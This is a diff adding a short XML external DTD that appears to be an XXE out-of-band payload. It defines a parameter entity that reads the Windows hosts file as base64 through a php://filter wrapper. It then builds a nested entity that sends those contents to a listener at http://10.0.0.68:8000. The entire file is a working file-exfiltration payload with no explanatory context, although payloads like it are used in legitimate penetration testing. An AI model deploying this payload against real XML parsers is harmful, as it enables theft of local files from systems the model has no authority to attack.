@@ -1,0 +1,5 @@
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///WINDOWS/system32/drivers/etc/hosts">
+<!ENTITY % remote
+"<!ENTITY &#37; send SYSTEM 'http://10.0.0.68:8000/%payload;'>">
+%remote;
+%send;
